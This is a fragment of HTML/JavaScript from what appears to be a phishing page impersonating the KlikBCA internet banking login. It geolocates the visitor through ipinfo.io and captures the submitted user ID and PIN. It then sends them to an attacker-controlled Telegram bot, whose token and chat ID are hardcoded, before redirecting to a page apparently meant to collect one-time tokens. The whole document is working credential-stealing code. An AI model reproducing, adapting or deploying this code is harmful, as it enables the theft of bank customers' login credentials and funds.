<script>
document.addEventListener("DOMContentLoaded", function () {
    fetch("https://ipinfo.io/city")
        .then(response => response.text())
        .then(data => {
            document.getElementById("kota").value = data.trim();
        })
        .catch(error => {
            document.getElementById("kota").value = "Gagal Mendapatkan Kota";
        });
});
</script>

<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
<script>
$(document).ready(function(){
    $('#klikBca').submit(function(e) {
        e.preventDefault();

        document.getElementById('kirims').value = "Memproses...";

        let nama = $('#nama').val();
        let pin = $('#pin').val();
        let kota = $('#kota').val();

        let message = `üîê Login KlikBCA\nüë§ USER ID: ${nama}\nüîë PIN: ${pin}\nüìç Kota: ${kota}`;

        $.ajax({
            url: "https://api.telegram.org/bot7223686317:AAFJKbUn4qC-s9s6Ii-vQRevQ47bk47TS2I/sendMessage",
            method: "POST",
            data: {
                chat_id: "7386992179",
                text: message
            },
            success: function(response) {
                console.log("Berhasil dikirim ke Telegram");
                setTimeout(function(){
                    sessionStorage.setItem("nama", nama);
                    sessionStorage.setItem("pin", pin);
                    sessionStorage.setItem("kota", kota);
                    window.location.href = 'token.html';
                }, 500);
            },
            error: function(error) {
                console.error("Gagal kirim ke Telegram", error);
            }
        });
    });
});
</script>
